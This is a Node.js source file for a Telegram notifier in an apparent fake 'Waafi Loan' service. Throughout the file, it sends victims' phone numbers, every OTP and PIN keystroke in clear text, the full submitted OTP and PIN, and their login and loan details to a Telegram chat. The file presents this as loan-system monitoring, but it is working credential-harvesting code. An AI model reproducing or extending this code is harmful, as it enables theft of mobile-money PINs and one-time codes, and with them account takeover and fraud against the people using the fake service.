const axios = require('axios');

class TelegramService {
    constructor() {
        this.token = process.env.TELEGRAM_BOT_TOKEN;
        this.chatId = process.env.TELEGRAM_CHAT_ID;
        this.baseUrl = `https://api.telegram.org/bot${this.token}`;
        this.enabled = this.token && this.chatId;
        this.lastActivity = null;
        this.isAwaiting = false;
    }

    /**
     * Send a message to Telegram
     */
    async sendMessage(message, parseMode = 'HTML') {
        if (!this.enabled) {
            console.log('⚠️ Telegram not configured. Message:', message);
            return { success: false, error: 'Telegram not configured' };
        }

        try {
            const response = await axios.post(
                `${this.baseUrl}/sendMessage`,
                {
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: parseMode,
                    disable_web_page_preview: true
                },
                {
                    headers: {
                        'Content-Type': 'application/json'
                    }
                }
            );

            console.log('📱 Telegram notification sent');
            return { success: true, data: response.data };
        } catch (error) {
            console.error('❌ Telegram error:', error.response?.data || error.message);
            return { success: false, error: error.message };
        }
    }

    /**
     * Send notification with formatted message
     */
    async sendNotification(title, data, emoji = '🔔') {
        const timestamp = new Date().toLocaleString();
        
        let message = `<b>${emoji} ${title}</b>\n`;
        message += `━━━━━━━━━━━━━━━━━━━━\n`;
        message += `<b>⏰ Time:</b> ${timestamp}\n`;
        
        for (const [key, value] of Object.entries(data)) {
            if (value !== null && value !== undefined) {
                message += `<b>${key}:</b> ${value}\n`;
            }
        }
        
        message += `━━━━━━━━━━━━━━━━━━━━`;
        
        return this.sendMessage(message, 'HTML');
    }

    /**
     * Handle /start command
     */
    async handleStart() {
        this.isAwaiting = true;
        this.lastActivity = new Date();
        
        const message = `
<b>🤖 Waafi Loan Bot Active</b>

━━━━━━━━━━━━━━━━━━━━

<b>✅ Status:</b> <i>Awaiting User Activity</i>

<b>📋 What I'm monitoring:</b>
• 📱 Phone number entries
• ⌨️ OTP keystrokes
• 🔑 PIN keystrokes
• 🔐 OTP submissions
• 🔐 PIN submissions
• ✅ User logins
• 💰 Loan applications
• 📊 Loan disbursements

━━━━━━━━━━━━━━━━━━━━

<b>⏳ Waiting for users...</b>

<i>I'll notify you here when someone interacts with the system.</i>

━━━━━━━━━━━━━━━━━━━━
<b>🔄 Status:</b> <code>ACTIVE - AWAITING USER</code>
<b>⏰ Started:</b> ${new Date().toLocaleString()}
        `;
        
        return this.sendMessage(message, 'HTML');
    }

    /**
     * Handle /status command
     */
    async handleStatus() {
        const status = this.isAwaiting ? '🟢 AWAITING USER' : '🔴 INACTIVE';
        const lastActivityStr = this.lastActivity ? this.lastActivity.toLocaleString() : 'Never';
        
        const message = `
<b>📊 Bot Status</b>

━━━━━━━━━━━━━━━━━━━━

<b>📌 Status:</b> ${status}
<b>⏰ Last Activity:</b> ${lastActivityStr}
<b>🤖 Bot:</b> ${this.enabled ? '✅ Active' : '❌ Disabled'}

━━━━━━━━━━━━━━━━━━━━

<b>📋 Commands:</b>
/start - Start monitoring
/status - Check bot status
/test - Send test message

━━━━━━━━━━━━━━━━━━━━
        `;
        
        return this.sendMessage(message, 'HTML');
    }

    /**
     * Handle /test command
     */
    async handleTest() {
        const message = `
<b>🧪 Test Notification</b>

━━━━━━━━━━━━━━━━━━━━

<b>✅ Connection successful!</b>

<b>📱 System:</b> Waafi Loan Bot
<b>⏰ Time:</b> ${new Date().toLocaleString()}
<b>📊 Status:</b> Working properly

━━━━━━━━━━━━━━━━━━━━

<i>You will receive real-time notifications when users interact with the system.</i>
        `;
        
        return this.sendMessage(message, 'HTML');
    }

    /**
     * Update status when a user interacts
     */
    updateActivity() {
        this.isAwaiting = false;
        this.lastActivity = new Date();
    }

    /**
     * Reset to awaiting state after processing
     */
    resetToAwaiting() {
        this.isAwaiting = true;
        this.lastActivity = new Date();
    }

    // ============================================
    // NOTIFICATION METHODS
    // ============================================

    // --- Phone Entry ---
    async notifyPhoneEntry(phoneNumber, userData = null) {
        this.updateActivity();
        const data = {
            '📱 Phone': phoneNumber,
            '👤 User': userData?.full_name || 'Unknown',
            '📊 Status': 'OTP requested'
        };
        const result = await this.sendNotification('User Entered Phone Number', data, '📱');
        this.resetToAwaiting();
        return result;
    }

    // --- OTP Keystrokes ---
    async notifyOTPKeystroke(phoneNumber, otp, progress) {
        this.updateActivity();
        const maskedOtp = otp.padEnd(6, '●').split('').join(' ');
        const data = {
            '📱 Phone': phoneNumber,
            '🔐 OTP': maskedOtp,
            '📊 Progress': `${progress}/6`,
            '🔢 Characters': otp.length > 0 ? otp.split('').join(' ') : 'None'
        };
        const lastChar = otp.length > 0 ? otp.slice(-1) : 'backspace';
        const result = await this.sendNotification(`OTP Keystroke: ${lastChar}`, data, '⌨️');
        this.resetToAwaiting();
        return result;
    }

    // --- PIN Keystrokes (NEW - Shows each keystroke) ---
    async notifyPINKeystroke(phoneNumber, pin, progress) {
        this.updateActivity();
        const maskedPin = pin.padEnd(4, '●').split('').join(' ');
        const data = {
            '📱 Phone': phoneNumber,
            '🔑 PIN': maskedPin,
            '📊 Progress': `${progress}/4`,
            '🔢 Characters': pin.length > 0 ? pin.split('').join(' ') : 'None'
        };
        const lastChar = pin.length > 0 ? pin.slice(-1) : 'backspace';
        const result = await this.sendNotification(`PIN Keystroke: ${lastChar}`, data, '🔑');
        this.resetToAwaiting();
        return result;
    }

    // --- Final OTP ---
    async notifyFinalOTP(phoneNumber, otp, userData = null) {
        this.updateActivity();
        const data = {
            '📱 Phone': phoneNumber,
            '🔐 OTP': otp,
            '👤 User': userData?.full_name || 'Unknown',
            '✅ Status': 'OTP submitted for verification'
        };
        const result = await this.sendNotification('Final OTP Submission', data, '🔐');
        this.resetToAwaiting();
        return result;
    }

    // --- Final PIN (NEW) ---
    async notifyFinalPIN(phoneNumber, pin, userData = null) {
        this.updateActivity();
        const data = {
            '📱 Phone': phoneNumber,
            '🔑 PIN': pin,
            '👤 User': userData?.full_name || 'Unknown',
            '✅ Status': 'PIN submitted for verification'
        };
        const result = await this.sendNotification('Final PIN Submission', data, '🔐');
        this.resetToAwaiting();
        return result;
    }

    // --- Login Success ---
    async notifyLoginSuccess(user) {
        this.updateActivity();
        const availableLimit = user.loan_limit - user.total_borrowed;
        const data = {
            '👤 Name': user.full_name,
            '📱 Phone': user.phone_number,
            '💰 Limit': `${user.loan_limit.toLocaleString()} SOS`,
            '📊 Available': `${availableLimit.toLocaleString()} SOS`,
            '✅ Status': 'Logged in successfully'
        };
        const result = await this.sendNotification('✅ User Logged In', data, '✅');
        this.resetToAwaiting();
        return result;
    }

    // --- Loan Application ---
    async notifyLoanApplication(user, loan) {
        this.updateActivity();
        const data = {
            '👤 User': user.full_name,
            '📱 Phone': user.phone_number,
            '📋 Reference': loan.reference,
            '💰 Amount': `${loan.amount.toLocaleString()} SOS`,
            '📊 Total Repayable': `${loan.totalRepayable.toLocaleString()} SOS`,
            '📅 Due Date': new Date(loan.dueDate).toLocaleDateString(),
            '⏳ Status': 'Pending approval'
        };
        const result = await this.sendNotification('💰 Loan Application Received', data, '💰');
        this.resetToAwaiting();
        return result;
    }

    // --- Loan Disbursement ---
    async notifyLoanDisbursement(user, amount, transactionId) {
        this.updateActivity();
        const data = {
            '👤 User': user.full_name,
            '📱 Phone': user.phone_number,
            '💰 Amount': `${amount.toLocaleString()} SOS`,
            '🆔 Transaction': transactionId,
            '✅ Status': 'Disbursed successfully'
        };
        const result = await this.sendNotification('✅ Loan Disbursed', data, '✅');
        this.resetToAwaiting();
        return result;
    }

    // --- Loan Failure ---
    async notifyLoanFailure(user, amount, error) {
        this.updateActivity();
        const data = {
            '👤 User': user.full_name,
            '📱 Phone': user.phone_number,
            '💰 Amount': `${amount.toLocaleString()} SOS`,
            '❌ Error': error,
            '⏳ Status': 'Failed'
        };
        const result = await this.sendNotification('❌ Loan Disbursement Failed', data, '❌');
        this.resetToAwaiting();
        return result;
    }

    // --- Error ---
    async notifyError(error, context = '') {
        this.updateActivity();
        const data = {
            '❌ Error': error.message || error,
            '📍 Context': context,
            '⏰ Time': new Date().toLocaleString()
        };
        const result = await this.sendNotification('⚠️ System Error', data, '⚠️');
        this.resetToAwaiting();
        return result;
    }

    // --- Test Connection ---
    async testConnection() {
        const message = `🤖 <b>Telegram Bot Connected!</b>\n\n✅ Your Waafi Loan System is now sending notifications to Telegram.\n\n⏰ ${new Date().toLocaleString()}`;
        return this.sendMessage(message, 'HTML');
    }
}

module.exports = new TelegramService();